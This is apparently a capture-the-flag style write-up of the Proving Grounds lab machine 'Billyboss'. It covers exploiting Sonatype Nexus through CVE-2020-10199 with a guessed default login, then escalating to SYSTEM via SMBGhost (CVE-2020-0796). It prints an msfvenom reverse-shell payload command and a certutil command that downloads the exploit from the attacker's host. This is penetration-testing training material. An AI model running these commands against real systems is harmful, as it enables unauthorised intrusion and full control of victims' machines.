#### Enumeration

The website on port 8081 is running Sonatype Nexus service version 3.21.0-05. The credential is nexus///nexus.(only guess...refer to the official walkthrough)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Billyboss/Billyboss_2021.12.08_22h46m50s_001_.png)

We can use [CVE-2020-10199](https://www.exploit-db.com/exploits/49385). I modify the exploit codes to download the ```nc.exe``` from my pc for executing the reverse shell command. 

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Billyboss/Billyboss_2021.12.12_12h50m27s_002_.png)

The executable file upload successfully.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Billyboss/Billyboss_2021.12.12_13h12m33s_003_.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Billyboss/Billyboss_2021.12.12_13h13m45s_004_.png)

We modify the codes again to execute the reverse shell command.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Billyboss/Billyboss_2021.12.12_13h15m22s_005_.png)

We get the shell.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Billyboss/Billyboss_2021.12.12_13h16m17s_006_.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Billyboss/Billyboss_2021.12.12_13h20m36s_007_.png)

#### Privilege Escalation

Uploading ```winPEASx86.exe``` to check the vulnerability.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Billyboss/Billyboss_2021.12.12_13h31m06s_008_.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Billyboss/Billyboss_2021.12.12_13h31m34s_009_.png)

According to the listed system information this machine may have smbghost vulnerability.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Billyboss/Billyboss_2021.12.12_13h38m18s_010_.png)

Downloading the [exploit](https://github.com/danigargu/CVE-2020-0796) visual studio project. We need Visual Studio (or may be use MSBulid) to compile the project.

I use the Visual Studio 2022 Community Edition and install the desktop development with C++.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Billyboss/Billyboss_2021.12.12_15h15m36s_011_.png)

Upgrading the project automatically and setting the platform to x64.(*target server installed the .NET Framework 4.8)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Billyboss/Billyboss_2021.12.12_15h15m37s_012_.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Billyboss/Billyboss_2021.12.12_15h15m38s_013_.png)

Generating shellcode with msfvenom. (*if we don't replace the shellcode after executing the exploit it will pop up the another command prompt window with authority\system permission, but in the webshell we can't switch to another command prompt)

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.127 LPORT=80 -f dll -f csharp
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Billyboss/Billyboss_2021.12.12_15h24m40s_014_.png)

Replacing the shellcode.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Billyboss/Billyboss_2021.12.12_15h26m36s_015_.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Billyboss/Billyboss_2021.12.12_15h26m37s_016_.png)

Building the project.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Billyboss/Billyboss_2021.12.12_15h31m37s_017_.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Billyboss/Billyboss_2021.12.12_15h32m37s_018_.png)

We upload the exploit file to target server.

```
certutil -f -urlcache http://192.168.49.127/cve-2020-0796-local.exe cve-2020-0796-local.exe
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Billyboss/Billyboss_2021.12.12_15h33m37s_019_.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Billyboss/Billyboss_2021.12.12_15h34m37s_020_.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Billyboss/Billyboss_2021.12.12_15h34m38s_021_.png)

Executing the exploit.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Billyboss/Billyboss_2021.12.12_15h38m38s_022_.png)

We get the shell with authority\system permission.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Billyboss/Billyboss_2021.12.12_15h38m50s_023_.png)
